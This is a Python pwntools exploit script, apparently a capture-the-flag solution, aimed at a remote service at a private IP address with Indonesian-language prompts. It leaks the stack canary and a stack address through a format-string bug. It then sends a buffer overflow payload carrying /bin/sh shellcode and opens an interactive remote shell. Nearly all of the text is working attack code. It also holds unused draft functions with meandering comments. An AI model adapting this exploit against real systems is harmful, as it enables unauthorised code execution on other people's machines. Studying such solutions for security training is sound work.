
from pwn import *

# --- Configuration ---
HOST = '10.1.2.228'
PORT = 1338

# Use amd64 architecture for shellcode
context.arch = 'amd64'
context.log_level = 'info'

def get_canary(p):
    """
    Uses the format string vulnerability in 'inscribe' to leak the stack canary.
    """
    p.recvuntil(b'> ')
    p.sendline(b'inscribe')
    p.recvuntil(b'>> ')
    
    # %13$p leaks the 13th value on the stack, which is the canary
    p.sendline(b'%13$p')
    
    p.recvuntil(b'Dinding sekarang bertuliskan: ')
    leaked_canary = p.recvline().strip()
    canary = int(leaked_canary, 16)
    
    log.success(f"Canary leaked: {hex(canary)}")
    return canary

def get_shell(p, canary):
    """
    Uses the buffer overflow in 'open_gate' to get a shell on the server.
    """
    p.recvuntil(b'> ')
    p.sendline(b'open')
    p.recvuntil(b'>> Masukkan kata sandi: ')
    
    # We need a stack address to jump back to. The RSP is the 11th value.
    # We can leak this at the same time as the canary, but for simplicity,
    # let's assume a static offset or just use a NOP sled. A simpler approach
    # is to find the address of the buffer itself, which is often at a known
    # offset from the canary leak. However, a simpler exploit for beginners
    # is often to just jump to a hardcoded offset that works due to disabled ASLR,
    # or to an address leaked via another format specifier like %11$p (RSP).
    # For this challenge, let's assume we need to execute shellcode on the stack.
    # The `gets` function reads into a buffer at `rsp+0h`. Let's jump there.
    # We first need to leak a stack address. Let's modify the leak function.
    
    # Let's re-do the leak to get both canary and a stack address
    p.sendline(b'inscribe')
    p.recvuntil(b'>> ')
    p.sendline(b'%11$p.%13$p') # 11th is RSP (stack pointer), 13th is canary
    p.recvuntil(b'Dinding sekarang bertuliskan: ')
    leaked_data = p.recvline().strip().split(b'.')
    stack_addr = int(leaked_data[0], 16)
    canary = int(leaked_data[1], 16)
    
    log.success(f"Leaked Stack Addr (RSP): {hex(stack_addr)}")
    log.success(f"Leaked Canary: {hex(canary)}")

    # The buffer starts at the leaked stack address. Let's jump there.
    return_address = stack_addr

    # Standard shellcode to execute /bin/sh
    shellcode = asm(shellcraft.sh())

    # Payload construction
    # Buffer in open_gate is 72 bytes.
    # [shellcode] + [padding] + [canary] + [rbp] + [return_addr]
    payload = shellcode
    payload = payload.ljust(72, b'A')  # Pad shellcode up to the canary
    payload += p64(canary)             # Overwrite with the correct canary
    payload += b'B' * 8                # 8 bytes for saved RBP
    payload += p64(return_address)     # Overwrite return address to point to our shellcode

    log.info("Sending payload to get shell...")
    p.sendline(payload)


def solve():
    """
    Main exploit function.
    """
    p = remote(HOST, PORT)

    # We need to leak both canary and stack address at once.
    # The simplest way is to call inscribe, then open.
    # Let's craft a combined function.
    
    # 1. Leak info
    p.recvuntil(b'> ')
    p.sendline(b'inscribe')
    p.recvuntil(b'>> ')
    p.sendline(b'%11$p.%13$p') # 11th is RSP (stack pointer), 13th is canary
    p.recvuntil(b'Dinding sekarang bertuliskan: ')
    leaked_data = p.recvline().strip().split(b'.')
    stack_addr = int(leaked_data[0], 16)
    canary = int(leaked_data[1], 16)
    
    log.success(f"Leaked Stack Addr (for return): {hex(stack_addr)}")
    log.success(f"Leaked Canary: {hex(canary)}")
    
    # 2. Craft and send payload
    p.recvuntil(b'> ')
    p.sendline(b'open')
    p.recvuntil(b'>> Masukkan kata sandi: ')

    return_address = stack_addr
    shellcode = asm(shellcraft.sh())

    payload = shellcode
    payload = payload.ljust(72, b'A')
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(return_address)

    log.info("Sending final payload...")
    p.sendline(payload)
    
    # 3. Enjoy the shell
    log.success("Payload sent! You should have a shell now.")
    p.interactive()

if __name__ == "__main__":
    solve()